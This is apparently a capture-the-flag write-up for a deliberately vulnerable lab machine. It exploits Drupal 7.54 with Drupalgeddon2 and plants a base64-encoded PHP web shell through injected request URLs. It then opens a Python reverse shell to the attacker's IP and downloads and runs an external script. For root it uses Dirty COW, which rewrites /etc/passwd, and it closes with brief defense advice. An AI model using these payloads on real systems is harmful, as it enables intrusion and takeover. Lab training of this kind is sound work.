## Reconnaissance

Discover the IP using arp-scan <br>
```
$ arp-scan -l -I en1 -v
Interface: en1, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
192.168.0.105	08:00:27:e5:04:1a	CADMUS COMPUTER SYSTEMS
```

Check the services/ports exposed using nmap

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http?   syn-ack
1898/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
```

From the generator header, we can see that the application is running on Drupal and version probably 7 <br>
Also, there is an interesting file ```CHANGELOG.txt``` which exposes the accurate version used under 7.x

```
Drupal 7.54, 2017-02-01
-----------------------
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
```

## Exploitation

Now that we have figured the exact version, let's check if there are any exploits available. 

From [CVE-2018-7600-Drupal-RCE](https://github.com/g0rx/CVE-2018-7600-Drupal-RCE) and [Druppalgeddon2](https://github.com/dreadlocked/Drupalgeddon2), we can see that the Drupal version 7.54 is vulnerable to RCE.

```
[*] Testing: Code Execution   (Method: name)
[v] HTTP - URL : http://192.168.0.105:1898/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo XMVRLQYC
[+] Result : XMVRLQYC
[v] HTTP - URL : http://192.168.0.105:1898/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee lampioaa.php
```

Luckily the exploit which we ran, automatically creates a shell and prompts us with a jailed environment with a lot of restrictions.

We can get a reverse shell using Python with ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.104",13337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``` 

Reverse shells generally don't have tty enabled and we need to upgrade our shell so that we can run commands like `sudo` `su` `ssh`

To enable tty on a jailed shell, we can run, ```python -c 'import pty; pty.spawn("/bin/sh")'```

<p align="center">
  <img src="https://github.com/gameFace22/vulnhub-walkthrough/blob/master/images/tty-no-tty.png">
</p>

## Privilege Escalation

Now that we have shell access, we need to escalate this to ```root``` to read the flag. 
Let us run ```linux-exploit-suggester``` to check if the kernel has any publicly available exploits. 

```
www-data@lampiao:/tmp$ wget --quiet https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && chmod +x les.sh && ./les.sh
Available information:
Kernel version: 4.4.0
Architecture: i686
<snipped>
Possible Exploits:
[+] [CVE-2016-5195] dirtycow 2
   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
 <snipped>
 ```
 
Let us pull the exploit and try it. It is important that we compile with the specified flags else we might get warnings, errors during compilation time. 

Running the dcow exploit, rewrites the ```root``` password to ```dirtyCowFun``` in the ```/etc/passwd``` file
We can ssh as the root user with the modified password. 

<p align="center">
  <img src="https://github.com/gameFace22/vulnhub-walkthrough/blob/master/images/root-lamp.png">
</p>

## Defense 

1) Firewall/IDS/IPS rule to detect signature of druppalgeddon and block it. 
2) Disable access to sensitive files like CHANGELOG.txt.
3) Limit the ACL for uploading, executing files in the OS level or Server level. 

## References 

1) https://netsec.ws/?p=337
2) https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell
